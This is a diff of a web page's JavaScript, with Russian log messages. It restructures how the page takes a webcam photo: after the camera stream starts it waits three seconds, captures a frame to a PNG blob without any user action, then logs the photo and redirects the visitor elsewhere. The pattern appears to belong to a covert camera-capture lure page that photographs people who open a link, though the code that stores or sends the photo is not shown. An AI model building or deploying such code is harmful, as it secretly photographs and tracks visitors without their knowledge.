@@ -157,71 +157,74 @@
 
 
     function noasynchandleSuccess(stream) {
+      
+      console.log('Начинаем обработку потока камеры...');
+      window.stream = stream;
+      video.srcObject = stream;
 
       video.addEventListener('loadedmetadata', () => {
         console.log('Метаданные загружены, начинаем захват изображения через 3 секунды...');
-      
-        console.log('Начинаем обработку потока камеры...');
-        window.stream = stream;
-        video.srcObject = stream;
 
 
         const context = canvas.getContext('2d');
 
-        if (!photoTaken) {
-          console.log('Фотографирование...');
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          context.drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
-          canvas.toBlob(function(blob) {
-            console.log('Фотография создана');
-            savedPhoto = blob;
-            photoTaken = true;
-            setTimeout(function () {
-              logPhotoInfo();
-              redirectToFinalDestination();
-            }, 2000)
-          }, 'image/png');
-        }
+        setTimeout(function () {
+          if (!photoTaken) {
+            console.log('Фотографирование...');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
+            canvas.toBlob(function(blob) {
+              console.log('Фотография создана');
+              savedPhoto = blob;
+              photoTaken = true;
+              setTimeout(function () {
+                logPhotoInfo();
+                redirectToFinalDestination();
+              }, 2000);
+            }, 'image/png');
+          }
+        }, 3000);
 
-      })
+      });
     }
-
-    function handleSuccess(stream) {
-      video.addEventListener('loadedmetadata', () => {
-        console.log('Метаданные загружены, начинаем захват изображения через 3 секунды...');
-        handleSuccessnext(stream)
-        })
-    }
+    
 
 
-    async function handleSuccessnext(stream) {
+    async function handleSuccess(stream) {
 
       console.log('Начинаем обработку потока камеры...');
       window.stream = stream;
       video.srcObject = stream;
       video.muted = true;
       await video.play();
-      const { videoWidth, videoHeight } = video;
 
-      const context = canvas.getContext('2d');
+      video.addEventListener('loadedmetadata', () => {
+        console.log('Метаданные загружены, начинаем захват изображения через 3 секунды...');
 
-      if (!photoTaken) {
-          canvas.width = videoWidth;
-          canvas.height = videoHeight;
-          context.drawImage(video, 0, 0, videoWidth, videoHeight);
-          canvas.toBlob(function(blob) {
-                console.log('Фотография создана');
-                savedPhoto = blob;
-                photoTaken = true;
-                
-                setTimeout(function () {
-                  logPhotoInfo();
-                  redirectToFinalDestination();
-                }, 2000)
-                
-              }, 'image/png');
-            }
+        const { videoWidth, videoHeight } = video;
+
+        const context = canvas.getContext('2d');
+
+        setTimeout(function () {
+          if (!photoTaken) {
+              canvas.width = videoWidth;
+              canvas.height = videoHeight;
+              context.drawImage(video, 0, 0, videoWidth, videoHeight);
+              canvas.toBlob(function(blob) {
+                    console.log('Фотография создана');
+                    savedPhoto = blob;
+                    photoTaken = true;
+                    
+                    setTimeout(function () {
+                      logPhotoInfo();
+                      redirectToFinalDestination();
+                    }, 2000);
+                    
+                  }, 'image/png');
+                }}, 3000);
+
+      });
     }
 
     function logPhotoInfo() {
